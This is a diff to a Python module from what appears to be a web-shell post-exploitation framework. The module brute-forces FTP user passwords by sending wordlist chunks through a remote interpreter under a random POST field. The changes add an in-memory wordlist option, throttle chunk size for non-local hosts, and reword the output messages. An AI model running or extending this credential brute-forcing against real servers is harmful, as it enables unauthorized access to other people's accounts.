@@ -12,7 +12,7 @@ from math import ceil
 classname = 'Ftp'
  
 class Ftp(Module):
-    '''Bruteforce ftp users. 
+    '''Bruteforce ftp user
     :bruteforce.ftp <host> <port> <user> <local_file_list.txt> <start_line>|all
     '''
     
@@ -39,18 +39,24 @@ break;
         Module.__init__(self, modhandler, url, password)
         
         
-    def run( self, host, port, user, filename, start_line):
+    def run( self, host, port, user, filename, start_line, substitutive_wl = []):
 
         if start_line == 'all':
             start_line = 0
 
-        try:
-            wordlist = open(filename, 'r')
-        except e:
-            raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))
+        if host not in ('localhost', '127.0.0.1'):
+            self.chunksize = 20
 
-        
-        wl_splitted = [ w.strip() for w in wordlist.read().split() ]
+        if substitutive_wl:
+            wl_splitted = substitutive_wl
+        else:
+            
+            try:
+                wordlist = open(filename, 'r')
+            except Exception, e:
+                raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))
+    
+            wl_splitted = [ w.strip() for w in wordlist.read().split() ]
 
 
         rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
@@ -78,8 +84,10 @@ break;
         
         chunks = int(ceil(len(wl)/self.chunksize))
         
-        self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, len(wl), chunks+1, self.chunksize))
-        
+        if len(wl) > self.chunksize:
+            self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, len(wl), chunks+1, self.chunksize))
+
+            
         for i in range(chunks+1):
         
             startword = i*self.chunksize
@@ -93,11 +101,12 @@ break;
             payload = self.__prepare_payload(vector, parameters[:-2]) 
             
             response = self.modhandler.load(vector.interpreter).run(payload, post_data = {rand_post_name : joined_wl})
+            
             if response:
                 if response.startswith('+'):
-                    return "[%s] FOUND %s" % (self.name,response[1:])
+                    return "[%s] FOUND! (%s)" % (self.name,response[1:])
             else:
-                self.mprint("[%i] %s:%s " % (endword+start_line, parameters[2], wl[endword]))
+                self.mprint("Try #%i: (%s:%s) ..." % (endword+start_line, parameters[2], wl[endword]))
 
 
     def __prepare_payload( self, vector, parameters ):
